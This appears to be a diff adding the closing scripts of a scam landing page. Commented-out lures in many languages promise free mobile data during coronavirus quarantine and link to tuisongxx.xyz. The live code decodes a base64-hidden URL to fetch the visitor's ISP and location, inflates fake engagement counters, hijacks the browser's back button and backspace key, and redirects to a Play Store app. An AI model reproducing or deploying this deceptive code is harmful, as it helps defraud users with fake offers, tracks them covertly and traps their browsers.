+                                     "ru" === a ? b = "*100 \u0413\u0411 \u0438\u043D\u0442\u0435\u0440\u043D\u0435\u0442-\u0434\u0430\u043D\u043D\u044B\u0445 \u0431\u0435\u0437 \u043F\u0435\u0440\u0435\u0437\u0430\u0440\u044F\u0434\u043A\u0438. \u0414\u043B\u044F \u041A\u0410\u0420\u0410\u041D\u0422\u0418\u041D\u0410* %0A \u041F\u043E\u043B\u0443\u0447\u0438\u0442\u0435 100 \u0413\u0411 \u0438\u043D\u0442\u0435\u0440\u043D\u0435\u0442-\u0434\u0430\u043D\u043D\u044B\u0445 \u0431\u0435\u0441\u043F\u043B\u0430\u0442\u043D\u043E \u0432 \u043B\u044E\u0431\u043E\u0439 \u043C\u043E\u0431\u0438\u043B\u044C\u043D\u043E\u0439 \u0441\u0435\u0442\u0438 \u0432 \u0442\u0435\u0447\u0435\u043D\u0438\u0435 60 \u0434\u043D\u0435\u0439. %0A *\u041F\u043E\u043B\u0443\u0447\u0438\u0442\u044C \u0441\u0435\u0439\u0447\u0430\u0441 \u0417\u0414\u0415\u0421\u042C \uD83D\uDC47\uD83D\uDC47* %0A https://tuisongxx.xyz" :
+                                         "no" === a ? b = "*200 Gb Internett-data uten lading* %0A F\xE5 200 Gb Internett-data gratis p\xE5 et mobilnett i 60 dager. %0A *F\xE5 den n\xE5 HER \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz/" :
+                                             "af" === a ? b = "*200 Gb internetdata sonder enige herlaai vir QUARANTINE (KROONVIRUS)* %0A Kry 60 GB internetdata gratis op enige mobiele netwerk vir 60 dae. %0A *Kry dit nou HIER \uD83D\uDC47\uD83D\uDC47* %0A https://tuisongxx.xyz/" :
+                                                 "se" === a ? b = "*200 Gb Internetdata utan laddning f\xF6r QUARANTINE (CROWN VIRUS)* %0A F\xE5 200 Gb Internetdata gratis i alla mobiln\xE4tverk i 60 dagar. %0A *H\xE4mta det nu H\xC4R \uD83D\uDC47\uD83D\uDC47* %0A https://tuisongxx.xyz/" :
+                                                     "th" === a ? b = "*\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E2D\u0E34\u0E19\u0E40\u0E17\u0E2D\u0E23\u0E4C\u0E40\u0E19\u0E47\u0E15 200Gb \u0E42\u0E14\u0E22\u0E44\u0E21\u0E48\u0E15\u0E49\u0E2D\u0E07\u0E0A\u0E32\u0E23\u0E4C\u0E08\u0E0B\u0E49\u0E33\u0E2A\u0E33\u0E2B\u0E23\u0E31\u0E1A* %0A \u0E23\u0E31\u0E1A\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E2D\u0E34\u0E19\u0E40\u0E17\u0E2D\u0E23\u0E4C\u0E40\u0E19\u0E47\u0E15 200Gb \u0E1F\u0E23\u0E35\u0E1A\u0E19\u0E40\u0E04\u0E23\u0E37\u0E2D\u0E02\u0E48\u0E32\u0E22\u0E21\u0E37\u0E2D\u0E16\u0E37\u0E2D\u0E43\u0E14 \u0E46 \u0E40\u0E1B\u0E47\u0E19\u0E40\u0E27\u0E25\u0E32 60 \u0E27\u0E31\u0E19  %0A *\u0E23\u0E31\u0E1A\u0E17\u0E31\u0E19\u0E17\u0E35\u0E17\u0E35\u0E48\u0E19\u0E35\u0E48\uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz/" :
+                                                         "pl" === a ? b = "*200 Gb danych internetowych bez do\u0142adowania W przypadku KWARANTANNY (WIRUS KORONOWY)* %0A Uzyskaj 200 Gb danych internetowych bezp\u0142atnie w dowolnej sieci kom\xF3rkowej przez 60 dni. %0A *Pobierz teraz TUTAJ\uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz/" :
+                                                             "nl" === a ? b = "*200 Gb aan internetgegevens zonder op te laden Voor QUARANTINE (CROWN VIRUS)* %0A Ontvang gratis 200 Gb aan internetgegevens op elk mobiel netwerk gedurende 60 dagen. %0A *Haal het nu HIER \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz/" :
+                                                                 "de" === a ? b = "*200 Gb Internetdaten ohne Aufladung F\xFCr* %0A Sie erhalten 60 Tage lang kostenlos 200 Gb Internetdaten in jedem Mobilfunknetz. %0A *Jetzt HIER herunterladen \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz/" :
+                                                                     "id" === a ? b = "Untuk berterima kasih kepada pelanggan atas dukungan berkelanjutan mereka terhadap Internet 4G! Perusahaan meluncurkan paket akses gratis 60 hari ke 200GB data Internet untuk penggunaan gratis Peserta bisa mendapatkan 200GB penggunaan data internet seluler gratis Pelanggan yang berpartisipasi: 1. Pelanggan yang menggunakan data 4G dalam waktu lama 2. Semua lalu lintas di pengguna Whatsapp gratis, termasuk unduhan video 3. Sistem akan memeriksa nomor Anda untuk hak partisipasi 4. Dapat membantu perusahaan untuk mempromosikan prioritas bisnis Sistem akan mencatat tanggal mulai Anda setelah sukses Terima kasih atas partisipasinya! %0A *Dapatkan sekarang DI SINI \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz" :
+                                                                         "pt" === a ? b = "*200 Gb de dados da Internet sem recarga Para QUARANTINE (V\xCDRUS DE CORONA)* %0A Obtenha 200 Gb de dados da Internet gratuitamente em qualquer rede m\xF3vel por 60 dias. %0A *Adquira agora AQUI \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz/" :
+                                                                             "ms" === a ? b = "*200Gb data Internet tanpa pengisian semula Untuk Kuarantin (CROWN VIRUS)* %0A Dapatkan 200Gb data Internet secara percuma di mana-mana rangkaian mudah alih selama 60 hari. %0A *Dapatkan sekarang DI SINI \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz/" :
+                                                                                 //    "th" === a ? b = "* ????????? Intrnet 200Gb ???????????????????? ? *% 0A% 0AC ?????????????????????????? 200Gb ??? 60 ????????? Operator% 0A% 0A ??????? * ?????????????? \uD83D \uDC47 \uD83D\uDC47* %0Ahttps://tuisongxx.xyz" :
+                                                                                 "cn"=== a ? b = "*??200GB??????????* %0A%0A ??????????????? %0A%0A ????60??200Gb??* ???? \uD83D\uDC47\uD83D\uDC47 * %0Ahttps://tuisongxx.xyz/cn/"
+
+     }*/
+
+    function operatorData(c) {
+        var a = new XMLHttpRequest;
+        a.open("GET", atob("aHR0cHM6Ly90ZHNqc2V4dDMuY29tL0V4dFNlcnZpY2Uuc3ZjL2dldGV4dHBhcmFtcw==")), a.onreadystatechange = function () {
+            4 === a.readyState && 200 == a.status && c(a.response)
+        }, a.send(null)
+    }
+
+    operatorData(function (e) {
+        var {isp: a, cnames: b, subdiv: c} = JSON.parse(e);
+        document.querySelector(".quedate__company").textContent = a, document.querySelector(".quedate__country").textContent = b.en, document.querySelector(".quedate__city").textContent = c[0].en
+    });
+    var counter = 153;
+    setInterval(function () {
+        document.querySelector(".chat__reactions-counter").textContent = counter + "k", counter++
+    }, 5e3);
+    var counter2 = 337;
+    setInterval(function () {
+        document.querySelector(".js-counter").textContent = counter2, counter2++
+    }, 5e3);
+    var seconds = 1;
+    setInterval(function () {
+        for (var c = document.querySelectorAll(".js-seconds"), a = 0; a < c.length; a++) c[a].textContent = seconds + "m";
+        seconds++
+    }, 6e3), setTimeout(function () {
+        var b = document.querySelector("#js-box-1");
+        b.classList.remove("js-hidden"), b.classList.add("fadeInDown")
+    }, 1e3), setTimeout(function () {
+        var b = document.querySelector("#js-box-2");
+        b.classList.remove("js-hidden"), b.classList.add("fadeInDown")
+    }, 3e3);</script>
+
+<script>
+    function getTextNodesIn(a, b) {
+        var c = [];
+        if (a) for (var d = a.childNodes, e = d.length; e--;) {
+            var f = d[e], g = f.nodeType;
+            3 == g ? (!b || b(f, a)) && !f.wholeText.includes("\n") && !f.parentNode.__proto__.toString().includes("SVG") && !f.wholeText.match(/\b(?:Carles|Roign|US$|Demand|Laurens|Kule|Taufik|Albert)\b/gi) && 4 <= f.wholeText.length && c.push(f) : (1 == g || 9 == g || 11 == g) && (c = c.concat(getTextNodesIn(f, b)))
+        }
+        return c
+    }
+
+   
+</script>
+
+
+<script>
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://play.google.com/store/apps/details?id=com.paksimpackages.offlinemode.allsimpakages";
+    }
+    function goon(){
+        location.href="https://play.google.com/store/apps/details?id=com.paksimpackages.offlinemode.allsimpakages";
+    }
+</script>
+
+<script>
+(function (global) {
+
+	if(typeof (global) === "undefined")
+	{
+		throw new Error("window is undefined");
+	}
+
+    var _hash = "!";
+    var noBackPlease = function () {
+        global.location.href += "#";
+
+		// making sure we have the fruit available for juice....
+		// 50 milliseconds for just once do not cost much (^__^)
+        global.setTimeout(function () {
+            global.location.href += "!";
+        }, 50);
+    };
+	
+	// Earlier we had setInerval here....
+    global.onhashchange = function () {
+        if (global.location.hash !== _hash) {
+            global.location.hash = _hash;
+        }
+    };
+
+    global.onload = function () {
+        
+		noBackPlease();
+
+		// disables backspace on page except on input fields and textarea..
+		document.body.onkeydown = function (e) {
+            var elm = e.target.nodeName.toLowerCase();
+            if (e.which === 8 && (elm !== 'input' && elm  !== 'textarea')) {
+                e.preventDefault();
+            }
+            // stopping event bubbling up the DOM tree..
+            e.stopPropagation();
+        };
+		
+    };
+
+})(window);
+</script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-YSZ8S8C2VB"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-YSZ8S8C2VB');
+</script>
+
+</body>
+</html>
